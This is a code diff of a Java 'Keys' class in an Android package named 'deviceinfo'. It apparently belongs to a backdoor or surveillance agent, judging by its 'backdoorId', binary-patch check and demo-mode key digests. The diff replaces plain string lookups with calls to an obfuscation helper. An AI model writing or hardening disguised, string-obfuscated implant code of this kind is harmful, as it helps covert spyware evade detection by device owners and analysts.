@@ -14,13 +14,13 @@ import android.provider.Settings.Secure;
 import android.telephony.TelephonyManager;
 
 import com.android.deviceinfo.Device;
-import com.android.deviceinfo.Messages;
 import com.android.deviceinfo.Status;
 import com.android.deviceinfo.auto.Cfg;
 import com.android.deviceinfo.interfaces.iKeys;
 import com.android.deviceinfo.util.ByteArray;
 import com.android.deviceinfo.util.Check;
 import com.android.deviceinfo.util.Utils;
+import com.android.m.M;
 
 // This class should only be read by Device
 /**
@@ -108,7 +108,7 @@ public class Keys implements iKeys{
 			androidId = "EMPTY";
 		}
 
-		//20.0=9774d56d682e549c Messages.getString("20_0")
+		//20.0=9774d56d682e549c M.d("9774d56d682e549c")
 		if ("9774d56d682e549c".equals(androidId) && !Device.self().isSimulator()) { //$NON-NLS-1$
 			// http://code.google.com/p/android/issues/detail?id=10603
 			// http://stackoverflow.com/questions/2785485/is-there-a-unique-android-device-id
@@ -166,7 +166,7 @@ public class Keys implements iKeys{
 
 	public boolean isDemo() {
 		// Pg-WaVyPzMMMMmGbhP6qAigT md5= 863d9effe70187254d3c5e9c76613a99
-		byte[] demoDigest = ByteArray.hexStringToByteArray("863d9effe70187254d3c5e9c76613a99");
+		byte[] demoDigest = ByteArray.hexStringToByteArray(M.e("863d9effe70187254d3c5e9c76613a99"));
 		byte[] calculated = Digest.MD5(demoMode);
 		
 		boolean ret = Arrays.equals(calculated, demoDigest);
@@ -212,7 +212,7 @@ public class Keys implements iKeys{
 	 */
 	public boolean hasBeenBinaryPatched() {
 		// EMp7Ca7-fpOBIr md5=b1688ffaaaafd7c1cab52e630b53178f		
-		byte[] bDigest = ByteArray.hexStringToByteArray("b1688ffaaaafd7c1cab52e630b53178f");		
+		byte[] bDigest = ByteArray.hexStringToByteArray(M.e("b1688ffaaaafd7c1cab52e630b53178f"));		
 		byte[] calculated = Digest.MD5(backdoorId);
 
 		if (Cfg.DEBUG) {
@@ -275,7 +275,7 @@ public class Keys implements iKeys{
 	static public  byte[] getSubtype() {
 		if (Cfg.DEMO) {
 			// 20.1=DEMO
-			return ("ANDROID-" + Messages.getString("20_1")).getBytes();
+			return ("ANDROID-" + M.e("DEMO")).getBytes();
 		} else {
 			return "ANDROID".getBytes();
 		}
